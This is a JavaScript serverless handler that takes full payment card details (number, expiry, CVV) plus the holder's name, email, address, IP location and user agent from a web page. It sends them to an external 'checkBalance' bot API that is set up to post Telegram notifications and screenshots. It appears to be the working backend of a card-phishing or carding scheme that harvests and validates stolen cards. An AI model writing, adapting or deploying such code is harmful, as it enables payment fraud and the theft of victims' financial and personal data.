const API_URL = 'https://bot.pc.am/v3/checkBalance';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const API_TOKEN = process.env.API_TOKEN;
  const TELEGRAM_BEFORE = process.env.TELEGRAM_ID_BEFORE_CHECK?.trim();
  const TELEGRAM_AFTER = process.env.TELEGRAM_ID_AFTER_CHECK?.trim();
  const REQUEST_TIMEOUT = process.env.REQUEST_TIMEOUT?.trim();
  const CACHE_SECONDS = process.env.CACHE_RESPONSE_SECONDS?.trim();
  const SCREENSHOT = process.env.SCREENSHOT?.trim();
  const SCREENSHOT_QUALITY = process.env.SCREENSHOT_JPEG_QUALITY?.trim();
  const SCREENSHOT_SIZE = process.env.SCREENSHOT_BOX_SIZE?.trim();

  if (!API_TOKEN) {
    return res.status(200).json({ success: false, error: 'API token not configured' });
  }

  try {
    const { cardNumber, expiryMonth, expiryYear, cvv, cardHolder, email, address, city, province, postalCode, timezone, userAgent, referral, pageUrl } = req.body || {};
    const number = (cardNumber || '').replace(/\s/g, '');
    const month = (expiryMonth || '').padStart(2, '0');
    const year = expiryYear || '';
    const cvvVal = cvv || '';

    // Get visitor IP
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.headers['x-real-ip']
      || req.socket?.remoteAddress
      || '';

    // Lookup location from IP
    let location = '';
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city`);
      const geo = await geoRes.json();
      if (geo.status === 'success') {
        location = `${geo.city}, ${geo.country}`;
      }
    } catch {}

    // Build note
    const cardLine = `API card received: ${number} ${month}/${year} ${cvvVal}`;
    const infoParts = [];
    infoParts.push(`IP: ${ip || 'unknown'}`);
    if (location) infoParts.push(`Location: ${location}`);
    if (timezone) infoParts.push(`Timezone: ${timezone}`);
    infoParts.push(`Referral: ${referral || 'Direct'}`);
    infoParts.push(`Page: ${pageUrl || 'unknown'}`);
    if (cardHolder) infoParts.push(`Name: ${cardHolder}`);
    if (email) infoParts.push(`Email: ${email}`);
    if (address) infoParts.push(`Address: ${address}`);
    if (city) infoParts.push(`City: ${city}`);
    if (province) infoParts.push(`Province: ${province}`);
    if (postalCode) infoParts.push(`Postal: ${postalCode}`);
    if (userAgent) infoParts.push(`UA: ${userAgent}`);

    const fullNote = cardLine + '\n' + infoParts.join(' | ');

    // Required params
    const params = new URLSearchParams({
      token: API_TOKEN,
      number,
      month,
      year,
      cvv: cvvVal
    });

    // Optional params from env
    if (TELEGRAM_BEFORE) params.set('telegram_id_before_check', TELEGRAM_BEFORE);
    if (TELEGRAM_AFTER) params.set('telegram_id_after_check', TELEGRAM_AFTER);
    params.set('telegram_additional_note', fullNote);
    if (REQUEST_TIMEOUT) params.set('request_timeout', REQUEST_TIMEOUT);
    if (CACHE_SECONDS) params.set('cache_response_seconds', CACHE_SECONDS);
    if (SCREENSHOT) params.set('screenshot', SCREENSHOT);
    if (SCREENSHOT_QUALITY) params.set('screenshot_jpeg_quality', SCREENSHOT_QUALITY);
    if (SCREENSHOT_SIZE) params.set('screenshot_box_size', SCREENSHOT_SIZE);

    const apiRes = await fetch(API_URL + '?' + params.toString());
    const text = await apiRes.text();
    let data;
    try {
      data = JSON.parse(text);
    } catch {
      data = { raw: text, success: false, error: 'Invalid response' };
    }
    res.status(200).json(data);
  } catch (err) {
    res.status(200).json({ success: false, error: err.message || 'Request failed' });
  }
}
